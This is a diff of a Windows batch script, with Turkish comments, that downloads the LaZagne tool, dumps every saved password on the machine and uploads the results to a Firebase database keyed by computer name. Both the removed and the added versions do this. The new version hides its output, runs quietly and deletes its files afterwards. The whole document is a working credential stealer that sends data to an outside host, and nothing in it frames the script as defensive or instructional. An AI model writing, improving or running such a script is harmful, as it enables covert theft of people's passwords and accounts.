@@ -1,34 +1,35 @@
 @echo off
-setlocal EnableDelayedExpansion
+:: 1. Bilgisayar mimarisini tespit et
+set ARCH=
+if defined ProgramFiles(x86) (
+    set ARCH=x64
+) else (
+    set ARCH=x86
+)
 
-:: === CONFIGURABLE ===
-set "LAZAGNE_URL=https://yourdomain.com/lazagne.exe"
-set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app"
+:: 2. Lazagne için doğru URL'yi ayarla (GitHub veya kendi depodan)
+if "%ARCH%"=="x64" (
+    set LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne-x64.exe
+) else (
+    set LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
+)
 
-:: === TEMP FILES ===
-set "LAZAGNE_FILE=lazagne.exe"
-set "OUTPUT=result.txt"
-set "COMP_NAME=%COMPUTERNAME%"
+:: 3. Lazagne'yi indir
+powershell -command "Invoke-WebRequest -Uri %LAZAGNE_URL% -OutFile lazagne.exe" >nul 2>&1
 
-:: === STEP 1: Download lazagne ===
-echo [*] Downloading LaZagne...
-curl -o %LAZAGNE_FILE% %LAZAGNE_URL%
+:: 4. Bilgisayar adını değişkene al
+set COMPUTERNAME=%COMPUTERNAME%
 
-:: === STEP 2: Run lazagne on browsers ===
-echo [*] Extracting browser passwords...
-%LAZAGNE_FILE% browsers > %OUTPUT%
+:: 5. Lazagne'yi gizli modda çalıştır ve çıktıyı dosyaya kaydet
+lazagne.exe all > %TEMP%\pass_%COMPUTERNAME%.txt 2>nul
 
-:: === STEP 3: Upload to Firebase ===
-echo [*] Sending data to Firebase...
-powershell -Command ^
-    "$data = Get-Content '%OUTPUT%' | Out-String; " ^
-    "$uri = '%FIREBASE_URL%/credentials/%COMP_NAME%.json'; " ^
-    "Invoke-RestMethod -Uri $uri -Method PUT -Body ($data | ConvertTo-Json -Compress)"
+:: 6. Firebase'e göndermek için Python ya da curl kullanılabilir. Curl ile örnek:
+:: (curl Windows'a yüklü değilse önce onu indirip ayarlamak gerekebilir)
+curl -X PATCH -d @%TEMP%\pass_%COMPUTERNAME%.txt ^
+  "https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%.json" >nul 2>&1
 
-:: === STEP 4: Cleanup (optional) ===
-echo [*] Cleaning up...
-del %OUTPUT%
-del %LAZAGNE_FILE%
+:: 7. Geçici dosyayı temizle
+del %TEMP%\pass_%COMPUTERNAME%.txt
+del lazagne.exe
 
-echo [*] Done.
-pause
+exit
